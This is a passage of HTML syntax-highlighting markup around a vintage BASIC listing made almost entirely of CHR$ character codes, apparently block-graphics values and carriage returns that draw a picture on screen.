function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">143</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">171</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">180</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">135</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">149</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">181</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">151</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">151</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">168</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">159</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">139</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">138</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">189</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">184</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">130</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">191</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">160</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">151</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">131</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">129</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">170</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">181</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">176</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">144</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">13</span><span class=\"token punctuation\">)</span><span class=\"token function\">CHR$</span><span class=\"token punctuation\">(</span><span class=\"token number\">128</span><span class=\"token punctuation\">)</span><span 